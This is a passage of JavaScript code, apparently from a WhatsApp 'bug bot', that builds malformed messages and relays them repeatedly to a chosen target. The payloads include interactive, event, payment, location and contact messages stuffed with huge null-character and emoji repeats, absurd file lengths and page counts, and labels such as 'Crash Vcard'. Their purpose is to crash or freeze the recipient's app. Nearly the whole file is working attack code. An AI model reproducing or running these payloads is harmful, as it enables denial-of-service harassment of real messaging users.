                           selectedRowId: "id"
                       },
                       contextInfo: {
                       isForwarded: true,
                           forwardedNewsletterMessageInfo: {
                               newsletterJid: "404@newsletter",
                               serverMessageId: 1,
                               newsletterName: " ~# Wanna Die?"
                           }
                       },
                       description: " All Living Things Will Die. "
                   }
               }
           }
       }), 
       { userJid: target, quoted: typeNullZet }
    )

 for (let z = 0; z < 2; z++) {
   await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } })
   }
   console.log(warna.red('─────「 SkyZet 」─────'))
}

exports.mbg = async (KyuuRzy, target, text) => {
    let etc = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "",
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "skyzet - just wanna be yours",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: text,
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" i just wanna be yours \",\"body\":\"xxx\"}",
                            buttons: [
                                { 
                                    name: "single_select", 
                                    buttonParamsJson: `{"title":"𝐙͢͡𝐄𝐓̸ৄৄৄ𝐃͡𝐎͜𝐌͡𝐈𝐍͢𝐀̸𝐓̃𝐄${"ःऀँ⿆".repeat(60000)}","sections":[{"title":"𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ ⚗️","rows":[]}]}` 
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}",
                                },
                                { 
                                    name: "single_select",
                                    buttonParamsJson: `{"title":"𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ ⚗️","sections":[{"title":"anjay","rows":[]}]}`
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"ZETNEVERDIE\",\"flow_message_version\":\"9\",\"flow_token\":\"DIEDIEDIEDIEDIEDIE\"}`,
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}",
                                }
                            ],
                        },
                    },
                },
            },
        }),
        { userJid: target, quoted: typeNullZet }
    )

for (let i = 0; i < 5; i++) {
    await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } })
    }
    console.log(warna.cyan('─────「 SkyZet 」─────'))
}

exports.caltx = async (KyuuRzy, target) => {
    let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        scheduledTimestampMs: Date.now(),
                        callType: 2,
                        title: ""
                    }
                }
            },
        }),
        { userJid: target}
    )

for (let i = 0; i < 5; i++) {
    await KyuuRzy.relayMessage(target, etc.message, {})
    }
    console.log(warna.magenta('─────「 SkyZet 」─────'))
}

exports.paym = async (KyuuRzy, target) => {
  for (let i = 0; i < 25; i++) {
    KyuuRzy.relayMessage(target,
        {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        { participant: { jid: target } }
    )
  }
}

exports.locm = async (KyuuRzy, target, text, textt, image) => {
    let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: text,
                url: textt,
                jpegThumbnail: image
            }
        }),
        { userJid: target }
    )

    await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } })
}

exports.evm = async (KyuuRzy, target) => {
    let etc = generateWAMessageFromContent(
        target, proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        messageSecret: randomBytes(32)
                    },
                    eventMessage: {
                        isCanceled: false,
                        name: bug.aaa,
                        description: "\u0000".repeat(50000),
                        location: {
                            degreesLatitude: "0",
                            degreesLongitude: "0",
                            name: bug.ccc + " \u0004".repeat(50000)
                        },
                        joinLink: "https://wa.me/settings",
                        startTime: Date.now() + 1814400000
                    }
                }
            }
        }),
        { userJid: target }
    )
    
    for (let z = 0; z < 6; z++) {
    await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } })
    }
    console.log(warna.brightGreen('─────「 SkyZet 」─────'))
}

exports.combz = async (KyuuRzy, target) => {
      for (let z = 0; z < 6; z++) {
  await KyuuRzy.relayMessage(m.chat, {
                                        requestPaymentMessage: {
                                                currencyCodeIso4217: "XXX",
                                                amount1000: "9999999",
                                                noteMessage: {
                                                        "stickerMessage": {
                                                                "url": "https://mmg.whatsapp.net/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc?ccb=11-4&oh=01_Q5AaIAD-TDkmUl78ym4RtDRuW8UYO9L-2_eD_nZ4GJ8t4avr&oe=66F0DBAB&_nc_sid=5e03e0&mms3=true",
                                                                "fileSha256": "AsFkxvyLnK222nsY5s6MhoF4NSKwRg7ViAI5nTcPKUs=",
                                                                "fileEncSha256": "72VMs7G12NGe7VQ2xJ25sNemjAPsdhITdgyvHgrQmdM=",
                                                                "mediaKey": "1yHvOqdtF1xEwpPnudsJInh09EBqrJWEZcDma7K6ORo=",
                                                                "mimetype": "image/webp",
                                                                "height": 64,
                                                                "width": 64,
                                                                "directPath": "/v/t62.15575-24/25379495_1233047614391746_7167397995027803975_n.enc?ccb=11-4&oh=01_Q5AaIAD-TDkmUl78ym4RtDRuW8UYO9L-2_eD_nZ4GJ8t4avr&oe=66F0DBAB&_nc_sid=5e03e0",
                                                                "fileLength": "253140",
                                                                "mediaKeyTimestamp": "1724474267",
                                                                "firstFrameLength": 15246,
                                                                "firstFrameSidecar": "N4MITqGgH587+A==",
                                                                "isAnimated": true,
                                                                "stickerSentTs": "1724474267588",
                                                                "isAvatar": false,
                                                                "isAiSticker": false,
                                                                "isLottie": false,
                                                                contextInfo: {
                                                                        isForwarded: true,
                                                                        fromMe: false,
                                                                        participant: "0@s.whatsapp.net",
                                                                        remoteJid: m.chat,
                                                                        quotedMessage: {
                                                                                "documentMessage": {
                                                                                        "url": "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                                                                        "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                                                        "fileSha256": "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                                                                        "fileLength": "9999999999999",
                                                                                        "pageCount": 1316134911,
                                                                                        "mediaKey": "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                                                                        "fileName": " ⭑𝕯𝖊𝓥 𝖔𝖗𝖘𝖎𝖃 ▻ # 𝖢𝗋𝖺𝗌𝗁 Vcard :)",
                                                                                        "fileEncSha256": "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                                                                        "directPath": "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                                                                        "mediaKeyTimestamp": "1724474503",
                                                                                        "contactVcard": true, //triggered
                                                                                        "thumbnailDirectPath": "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                                                                        "thumbnailSha256": "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                                                                        "thumbnailEncSha256": "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                                                                        "jpegThumbnail": ""
                                                                                }
                                                                        },
                                                                        externalAdReply: {
                                                                                title: "x devorsixcore x",
                                                                                mediaType: "VIDEO",
                                                                                sourceUrl: "https://lol.devorsixcore.ml/crashcombine",
                                                                        },
                                                                        forwardedNewsletterMessageInfo: {
                                                                                newsletterJid: "120989263814683954@newsletter",
                                                                                serverMessageId: 1,
                                                                                newsletterName: " # ",
                                                                        }
                                                                }
                                                        }
                                                },
                                                expiryTimestamp: "0",
                                                amount: {
                                                        value: "999999999",
                                                        offset: 999999999,
                                                        currencyCode: "XXX",
                                                },
                                                background: {
                                                        id: "100",
                                                        fileLength: "928283",
                                                        width: 1000,
                                                        height: 1000,
                                                        mimetype: "stay withme - devorsixcore",
                                                        placeholderArgb: 4278190080,
                                                        textArgb: 4294967295,
                                                        subtextArgb: 4278190080,
                                                }
                                        }
                                }, {})
   }
   console.log(warna.brightYellow('─────「 SkyZet 」─────'))
}

exports.experiment1 = async (KyuuRzy, target) => {
  var message = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: "\u0000".repeat(600000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: "{\"reference_id\":\"" + "\u0000".repeat(100000) + "\",\"order\":{\"status\":\"canceled\",\"order_type\":\"ORDER\"},\"share_payment_status\":false}"
          },
          {
            name: 'call_permission_request',
            buttonParamsJson: '{}'
          },
          {
            name: 'payment_method',
            buttonParamsJson: "{}"
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "\u0000".repeat(70000),
              sections: [{
                title: "\u0000".repeat(70000),
                rows: []
              }]
            })
          },
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              flow_action: "navigate",
              flow_action_payload: {
                screen: "WELCOME_SCREEN"
              },
              flow_cta: ":)",
              flow_id: "GASWARRRRRRR",
              flow_message_version: "9",
              flow_token: "DIEDIEDIEDIE"
            })
          },
          {
            name: "mpm",
            buttonParamsJson: "{}"
          }
        ],
        messageParamsJson: "{}"
      }
    },
    contactMessage: {
      displayName: "BeComeToDie 👨‍👩‍👧‍👦" + "👩‍❤️‍👨".repeat(150000),
      vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;SkyZet Dominate;;;\nFN:✿ NullNullNull" + "👩‍❤️‍👨".repeat(120000) + "\nEND:VCARD"
    }
  }), {
    userJid: target,
    quoted: typeNullZet
  })

  await KyuuRzy.relayMessage(target, message.message, {
    participant: {
      jid: target
    },
    messageId: message.key.id
  })
  console.log(warna.brightGreen('─────「 SkyZet 」─────'))
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	//console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})


